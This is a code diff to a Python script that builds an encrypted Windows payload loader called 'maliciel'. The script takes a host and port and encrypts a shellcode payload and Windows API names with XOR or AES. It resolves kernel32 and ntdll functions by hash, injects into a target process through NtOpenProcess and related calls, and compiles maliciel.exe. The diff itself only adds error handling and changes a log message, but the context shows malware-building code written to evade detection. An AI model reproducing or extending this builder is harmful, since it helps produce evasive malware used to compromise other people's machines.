@@ -180,9 +180,13 @@ def run_maliciel(host, port, build, encryption, proc_name, mode):
             # data = data.replace('#define GETPROCADDRESS_HASH 0x00000000', '#define GETPROCADDRESS_HASH ' + str(getprocaddress_hash))
 
             tmp.close()
-            tmp = open("maliciel-enc.cpp", "w+")
-            tmp.write(data)
-            tmp.close()
+            try:
+                tmp = open("maliciel-enc.cpp", "w+")
+                tmp.write(data)
+                tmp.close()
+            except:
+                print (Colors.RED + "error generating template :(" + Colors.ENDC)
+                sys.exit() 
             
         elif encryption == '2':
             f_rce, f_xor, ciphertext, p_key, ciphertext_va, va_key, ciphertext_vp, vp_key, ciphertext_cth, ct_key, ciphertext_wfso, wfso_key, ciphertext_rmm, rmm_key = dllEncryptAES(encryptor, plaintext, f_va, f_vp, f_cth, f_wfso, f_rmm)
@@ -193,9 +197,13 @@ def run_maliciel(host, port, build, encryption, proc_name, mode):
             data = dllDataReplaceAES(f_rce, f_xor, f_aes, ciphertext, p_key, ciphertext_va, va_key, ciphertext_vp, vp_key, ciphertext_cth, ct_key, ciphertext_wfso, wfso_key, ciphertext_rmm, rmm_key, data)
 
             tmp.close()
-            tmp = open("maliciel-enc.cpp", "w+")
-            tmp.write(data)
-            tmp.close()
+            try:
+                tmp = open("maliciel-enc.cpp", "w+")
+                tmp.write(data)
+                tmp.close()
+            except:
+                print (Colors.RED + "error generating template :(" + Colors.ENDC)
+                sys.exit() 
         
         print (Colors.GREEN + "successfully encrypt template file :)" + Colors.ENDC)
 
@@ -246,9 +254,14 @@ def run_maliciel(host, port, build, encryption, proc_name, mode):
             data = peDataReplaceXOR(mode, f_xor, ciphertext, p_key, ciphertext_cth, ct_key, ciphertext_wfso, wfso_key, data, f_inj, f_ftm, ciphertext_vaex, vaex_key, ciphertext_wpm, wpm_key, ciphertext_clh, clh_key, ciphertext_p32f, p32f_key, ciphertext_p32n, p32n_key, ciphertext_op, op_key, ciphertext_ct32s, ct32s_key, ciphertext_proc, proc_key, ciphertext_k32, k32_key, kernel32_hash, getmodulehandle_hash, getprocaddress_hash)
 
             tmp.close()
-            tmp = open("maliciel-enc.cpp", "w+")
-            tmp.write(data)
-            tmp.close()
+            try:
+                tmp = open("maliciel-enc.cpp", "w+")
+                tmp.write(data)
+                tmp.close()
+            except:
+                print (Colors.RED + "error generating template :(" + Colors.ENDC)
+                sys.exit() 
+
         elif encryption == '2':
             f_xor, f_aes, ciphertext, p_key, ciphertext_cth, ct_key, ciphertext_wfso, wfso_key, f_inj, f_ftt, ciphertext_vaex, vaex_key, ciphertext_wpm, wpm_key, ciphertext_clh, clh_key, ciphertext_p32f, p32f_key, ciphertext_p32n, p32n_key, ciphertext_op, op_key, ciphertext_ct32s, ct32s_key, ciphertext_proc, proc_key, ciphertext_k32, k32_key = peEncryptAES(proc_name, encryptor, plaintext, f_cth, f_wfso, f_vaex, f_op, f_wpm, f_clh, f_p32f, f_p32n, f_ct32s, k32_name)
 
@@ -258,10 +271,14 @@ def run_maliciel(host, port, build, encryption, proc_name, mode):
             data = peDataReplaceAES(mode, f_xor, f_aes, ciphertext, p_key, ciphertext_cth, ct_key, ciphertext_wfso, wfso_key, data, f_inj, f_ftt, ciphertext_vaex, vaex_key, ciphertext_wpm, wpm_key, ciphertext_clh, clh_key, ciphertext_p32f, p32f_key, ciphertext_p32n, p32n_key, ciphertext_op, op_key, ciphertext_ct32s, ct32s_key, ciphertext_proc, proc_key, ciphertext_k32, k32_key)
 
             tmp.close()
-            tmp = open("maliciel-enc.cpp", "w+")
-            tmp.write(data)
-            tmp.close()
-            
+            try:
+                tmp = open("maliciel-enc.cpp", "w+")
+                tmp.write(data)
+                tmp.close()
+            except:
+                print (Colors.RED + "error generating template :(" + Colors.ENDC)
+                sys.exit() 
+
         print (Colors.GREEN + "successfully encrypt template file :)" + Colors.ENDC)
         print (Colors.BLUE + "compiling..." + Colors.ENDC)
         try:
@@ -273,7 +290,7 @@ def run_maliciel(host, port, build, encryption, proc_name, mode):
             sys.exit()
         else:
             print (Colors.YELLOW + cmd + Colors.ENDC)
-            print (Colors.GREEN + "successfully compiled :)" + Colors.ENDC)
+            print (Colors.GREEN + "successfully compiled maliciel.exe :)" + Colors.ENDC)
 
     elif build == '3':
         f_ntop = "NtOpenProcess"
@@ -314,9 +331,14 @@ def run_maliciel(host, port, build, encryption, proc_name, mode):
             data = ntDataReplaceXOR(mode, f_xor, ciphertext, p_key, ciphertext_wfso, wfso_key, data, f_ftm, ciphertext_clh, clh_key, ciphertext_p32f, p32f_key, ciphertext_p32n, p32n_key, ciphertext_ct32s, ct32s_key, ciphertext_proc, proc_key, ciphertext_k32, k32_key, kernel32_hash, getmodulehandle_hash, getprocaddress_hash, ciphertext_ntop, ntop_key, ciphertext_ntcs, ntcs_key, ciphertext_ntmvos, ntmvos_key, ciphertext_rcut, rcut_key, ciphertext_zw, zw_key, ciphertext_ntd, ntd_key)
 
             tmp.close()
-            tmp = open("maliciel-enc.cpp", "w+")
-            tmp.write(data)
-            tmp.close()
+            try:
+                tmp = open("maliciel-enc.cpp", "w+")
+                tmp.write(data)
+                tmp.close()
+            except:
+                print (Colors.RED + "error generating template :(" + Colors.ENDC)
+                sys.exit() 
+
         elif encryption == '2':
             f_xor, f_aes, ciphertext, p_key, ciphertext_wfso, wfso_key, f_ftt, ciphertext_clh, clh_key, ciphertext_p32f, p32f_key, ciphertext_p32n, p32n_key, ciphertext_ct32s, ct32s_key, ciphertext_proc, proc_key, ciphertext_k32, k32_key, f_cmh, f_cmhb, f_gk32, ciphertext_ntop, ntop_key, ciphertext_ntcs, ntcs_key, ciphertext_ntmvos, ntmvos_key, ciphertext_rcut, rcut_key, ciphertext_zw, zw_key, ciphertext_ntd, ntd_key = ntEncryptAES(proc_name, encryptor, plaintext, f_wfso, f_clh, f_p32f, f_p32n, f_ct32s, k32_name, f_ntop, f_ntcs, f_ntmvos, f_rcut, f_zw, ntdll_name)
             
@@ -331,9 +353,13 @@ def run_maliciel(host, port, build, encryption, proc_name, mode):
             data = ntDataReplaceAES(mode, f_xor, f_aes, ciphertext, p_key, ciphertext_wfso, wfso_key, data, f_ftt, ciphertext_clh, clh_key, ciphertext_p32f, p32f_key, ciphertext_p32n, p32n_key, ciphertext_ct32s, ct32s_key, ciphertext_proc, proc_key, ciphertext_k32, k32_key, kernel32_hash, getmodulehandle_hash, getprocaddress_hash, f_cmh, f_cmhb, f_gk32, ciphertext_ntop, ntop_key, ciphertext_ntcs, ntcs_key, ciphertext_ntmvos, ntmvos_key, ciphertext_rcut, rcut_key, ciphertext_zw, zw_key, ciphertext_ntd, ntd_key, loadlibrarya_hash)
 
             tmp.close()
-            tmp = open("maliciel-enc.cpp", "w+")
-            tmp.write(data)
-            tmp.close()
+            try:
+                tmp = open("maliciel-enc.cpp", "w+")
+                tmp.write(data)
+                tmp.close()
+            except:
+                print (Colors.RED + "error generating template :(" + Colors.ENDC)
+                sys.exit() 
 
         print (Colors.GREEN + "successfully encrypt template file :)" + Colors.ENDC)
 
@@ -347,7 +373,7 @@ def run_maliciel(host, port, build, encryption, proc_name, mode):
             sys.exit()
         else:
             print (Colors.YELLOW + cmd + Colors.ENDC)
-            print (Colors.GREEN + "successfully compiled :)" + Colors.ENDC)
+            print (Colors.GREEN + "successfully compiled maliciel.exe :)" + Colors.ENDC)
 
 def ntDataReplaceAES(mode, f_xor, f_aes, ciphertext, p_key, ciphertext_wfso, wfso_key, data, f_ftt, ciphertext_clh, clh_key, ciphertext_p32f, p32f_key, ciphertext_p32n, p32n_key, ciphertext_ct32s, ct32s_key, ciphertext_proc, proc_key, ciphertext_k32, k32_key, kernel32_hash, getmodulehandle_hash, getprocaddress_hash, f_cmh, f_cmhb, f_gk32, ciphertext_ntop, ntop_key, ciphertext_ntcs, ntcs_key, ciphertext_ntmvos, ntmvos_key, ciphertext_rcut, rcut_key, ciphertext_zw, zw_key, ciphertext_ntd, ntd_key, loadlibrarya_hash):
     data = data.replace('unsigned char my_payload[] = { };', 'unsigned char my_payload[] = ' + ciphertext)
